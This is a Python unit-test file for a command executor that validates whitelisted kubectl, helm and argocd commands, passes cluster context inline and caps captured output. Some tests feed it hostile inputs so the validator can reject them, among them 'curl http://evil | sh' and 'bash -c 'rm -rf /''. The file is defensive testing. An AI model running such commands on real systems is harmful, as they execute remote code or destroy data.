"""Unit tests for EnvironmentAwareCommandExecutor (Phase 12 S5/B4)."""

from unittest.mock import patch

import pytest

from app.actions.environment_executor import (
    EnvironmentAwareCommandExecutor,
    ExecutionEnvironment,
    ServiceAccountConfig,
)


class FakeStream:
    def __init__(self, data: bytes = b""):
        self._data = data

    async def read(self, n: int = -1):
        if not self._data:
            return b""
        size = len(self._data) if n < 0 else min(n, len(self._data))
        chunk, self._data = self._data[:size], self._data[size:]
        return chunk


class FakeProcess:
    def __init__(self, stdout=b"", stderr=b"", returncode=0):
        self.stdout = FakeStream(stdout)
        self.stderr = FakeStream(stderr)
        self.returncode = returncode

    async def wait(self):
        return self.returncode


def _make_executor() -> EnvironmentAwareCommandExecutor:
    return EnvironmentAwareCommandExecutor(dry_run=False, enable_logging=False)


def test_validate_blocks_non_whitelisted_binary():
    ex = _make_executor()
    assert ex._validate_command("curl http://evil | sh") is False
    assert ex._validate_command("bash -c 'rm -rf /'") is False


def test_validate_allows_whitelisted():
    ex = _make_executor()
    assert ex._validate_command("kubectl get pods") is True
    assert ex._validate_command("helm list") is True
    assert ex._validate_command("argocd app list") is True


@pytest.mark.asyncio
async def test_kubectl_uses_stateless_context_argv():
    """B4: kubectl gets inline --context/--kubeconfig, never `config use-context`."""
    ex = _make_executor()
    process = FakeProcess(stdout=b"ok", returncode=0)
    captured = {}

    async def fake_exec(*args, **kwargs):
        captured["argv"] = args
        return process

    with patch.object(
        __import__("app.actions.environment_executor", fromlist=["ServiceAccountConfig"]).ServiceAccountConfig,
        "get_kubeconfig_path",
        return_value="/tmp/kube-dev.yaml",
    ), patch.object(
        __import__("app.actions.environment_executor", fromlist=["ServiceAccountConfig"]).ServiceAccountConfig,
        "validate_credentials",
        return_value=True,
    ), patch("asyncio.create_subprocess_exec", side_effect=fake_exec):
        from app.actions.environment_executor import ExecutionEnvironment
        result = await ex.execute("kubectl get pods", environment=ExecutionEnvironment.DEVELOPMENT)

    assert result.success is True
    argv = captured["argv"]
    assert "--context" in argv and "dev-cluster" in argv
    assert "--kubeconfig" in argv and "/tmp/kube-dev.yaml" in argv
    assert "config" not in argv


def test_validate_rejects_malformed_command():
    """Security recheck F2: malformed input fails validation, never raises."""
    ex = _make_executor()
    # Empty / whitespace-only command → empty argv
    assert ex._validate_command("") is False
    assert ex._validate_command("   ") is False
    # Unbalanced quotes → shlex ValueError
    assert ex._validate_command('kubectl get pods "') is False


@pytest.mark.asyncio
async def test_execute_malformed_command_returns_value_error():
    """Security recheck F2: malformed command → ValueError, not IndexError/500."""
    ex = _make_executor()
    with pytest.raises(ValueError, match="Command validation failed"):
        await ex.execute("")
    with pytest.raises(ValueError, match="Command validation failed"):
        await ex.execute('kubectl logs "')


class TestExecutionResultFields:
    """Phase 12 manual smoke: the deduped ExecutionResult lost `environment`
    and `command`. Pydantic ignored the constructor kwargs, then
    _log_execution crashed on the missing attribute after the subprocess had
    already run — every real execution 500'd and never reached EXECUTED."""

    def test_result_carries_environment_and_command(self):
        from app.models.actions import ExecutionResult

        r = ExecutionResult(
            success=True, environment="staging", command="kubectl get pods"
        )
        assert r.environment == "staging"
        assert r.command == "kubectl get pods"

    def test_log_execution_does_not_crash(self):
        from app.actions.environment_executor import get_executor
        from app.models.actions import ExecutionResult

        get_executor()._log_execution(
            ExecutionResult(success=True, environment="staging", command="kubectl get pods")
        )


def test_validate_enforces_flag_whitelist():
    """Phase 15 P1-2: the env-aware path previously checked argv[0] only, so
    an approved `kubectl exec ...` passed the documented defense layer."""
    e = _make_executor()
    assert e._validate_command("kubectl exec web -- ls /") is False
    assert e._validate_command("kubectl config use-context prod") is False
    assert e._validate_command("kubectl get pods -o json") is True
    assert e._validate_command("kubectl rollout restart deployment api") is True


@pytest.mark.asyncio
async def test_real_execution_output_capped():
    """Phase 15 P2-4: the engine's real execution path (this executor) used
    process.communicate() — a runaway command streamed unbounded bytes into
    memory and the audit entry. Capture is now bounded with a marker."""
    ex = _make_executor()
    process = FakeProcess(stdout=b"x" * 150, stderr=b"e" * 150, returncode=0)
    with patch.object(ServiceAccountConfig, "get_kubeconfig_path", return_value=""), \
         patch.object(ServiceAccountConfig, "validate_credentials", return_value=True), \
         patch("app.actions.environment_executor.MAX_OUTPUT_BYTES", 100), \
         patch("asyncio.create_subprocess_exec", return_value=process):
        result = await ex.execute(
            "kubectl get pods",
            environment=ExecutionEnvironment.DEVELOPMENT,
        )

    assert result.success is True
    assert result.stdout == "x" * 100 + "\n[output truncated at 100 bytes]"
    assert result.stderr == "e" * 100 + "\n[output truncated at 100 bytes]"


@pytest.mark.asyncio
async def test_real_execution_below_cap_untouched():
    ex = _make_executor()
    process = FakeProcess(stdout=b"pod/web-1 Running", returncode=0)
    with patch.object(ServiceAccountConfig, "get_kubeconfig_path", return_value=""), \
         patch.object(ServiceAccountConfig, "validate_credentials", return_value=True), \
         patch("asyncio.create_subprocess_exec", return_value=process):
        result = await ex.execute(
            "kubectl get pods",
            environment=ExecutionEnvironment.DEVELOPMENT,
        )

    assert result.stdout == "pod/web-1 Running"
    assert "truncated" not in result.stdout
